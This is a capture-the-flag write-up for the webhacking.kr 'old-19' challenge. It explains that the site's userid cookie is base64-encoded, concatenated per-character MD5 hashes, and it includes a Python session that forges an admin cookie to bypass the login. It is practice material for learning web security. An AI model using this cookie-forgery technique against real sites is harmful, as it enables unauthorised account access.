# Old 19    Auth (Hashes Chars)

URL: [https://webhacking.kr/challenge/js-6/](https://webhacking.kr/challenge/js-6/)

![old-19-3.png](/assets/ctf/webhacking.kr/old-19-3.png)

If we submit `admin`:
![old-19-1.png](/assets/ctf/webhacking.kr/old-19-1.png)

URL becomes: `https://webhacking.kr/challenge/js-6/?id=admin`

After some testing I tried a single char: `https://webhacking.kr/challenge/js-6/?id=t`
We get cookie userid: `ZTM1OGVmYTQ4OWY1ODA2MmYxMGRkNzMxNmI2NTY0OWU`
Seems Base64, decoding gives: `e358efa489f58062f10dd7316b65649e`
Looks like hash, try https://crackstation.net gives `t`

The app seems to encode each character with md5 hash, concatenate and base64 encode for cookie.

To bypass we should do the same, but for admin. 

```python
Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
>>> from hashlib import md5
>>> from base64 import b64encode
>>> user = 'admin'
>>> hashed = ''.join(md5(c.encode()).hexdigest() for c in user)
>>> hashed
'0cc175b9c0f1b6a831c399e2697726618277e0910d750195b448797616e091ad6f8f57715090da2632453988d9a1501b865c0c0b4ab0e063e5caa3387c1a87417b8b965ad4bca0e41ab51de7b31363a1'
>>> cookie = b64encode(hashed.encode()).decode()
>>> cookie
'MGNjMTc1YjljMGYxYjZhODMxYzM5OWUyNjk3NzI2NjE4Mjc3ZTA5MTBkNzUwMTk1YjQ0ODc5NzYxNmUwOTFhZDZmOGY1NzcxNTA5MGRhMjYzMjQ1Mzk4OGQ5YTE1MDFiODY1YzBjMGI0YWIwZTA2M2U1Y2FhMzM4N2MxYTg3NDE3YjhiOTY1YWQ0YmNhMGU0MWFiNTFkZTdiMzEzNjNhMQ=='
```

Set cookie and refresh: 
![old-19-2.png](/assets/ctf/webhacking.kr/old-19-2.png)

